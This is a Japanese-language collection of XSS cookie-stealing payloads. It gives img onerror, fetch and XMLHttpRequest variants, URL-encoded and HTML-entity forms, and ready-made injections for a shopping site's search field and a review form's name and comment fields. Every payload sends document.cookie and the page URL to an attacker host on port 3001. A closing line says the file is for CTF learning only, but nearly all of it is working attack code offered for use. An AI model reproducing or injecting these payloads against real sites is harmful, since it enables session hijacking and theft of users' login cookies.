# XSS Cookie盗取ペイロード集

以下のペイロードをXSS脆弱性のあるサイトで使用して、Cookieを盗取できます。

## 基本的なペイロード

### 1. imgタグ（最もシンプル）

```html
<img src=x onerror="this.src='http://攻撃者のIP:3001/steal?cookies='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href)">
```

### 2. scriptタグ（fetch API）

```html
<script>
fetch('http://攻撃者のIP:3001/steal', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    cookies: document.cookie,
    url: window.location.href
  })
});
</script>
```

### 3. scriptタグ（XMLHttpRequest）

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://攻撃者のIP:3001/steal', true);
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.send(JSON.stringify({
  cookies: document.cookie,
  url: window.location.href
}));
</script>
```

### 4. 短縮版（imgタグ）

```html
<img src="http://攻撃者のIP:3001/steal?cookies="+document.cookie>
```

## エンコードされたペイロード

### URLエンコード

```
%3Cimg%20src%3Dx%20onerror%3D%22this.src%3D%27http%3A%2F%2F攻撃者のIP%3A3001%2Fsteal%3Fcookies%3D%27%2BencodeURIComponent%28document.cookie%29%22%3E
```

### HTMLエンティティ

```html
&lt;img src=x onerror="this.src='http://攻撃者のIP:3001/steal?cookies='+encodeURIComponent(document.cookie)"&gt;
```

## 実際の使用例

### XSSショッピングサイトの検索欄に

```
<script>fetch('http://192.168.1.100:3001/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:document.cookie,url:window.location.href})})</script>
```

### レビュー投稿フォームに

**お名前欄:**
```
<script>fetch('http://192.168.1.100:3001/steal',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cookies:document.cookie,url:window.location.href})})</script>
```

**コメント欄:**
```
<img src=x onerror="this.src='http://192.168.1.100:3001/steal?cookies='+encodeURIComponent(document.cookie)+'&url='+encodeURIComponent(window.location.href)">
```

## 注意事項

- `攻撃者のIP` を実際のIPアドレスに置き換えてください
- ポート番号（3001）も必要に応じて変更してください
- 実際の攻撃に使用しないでください（CTF学習目的のみ）
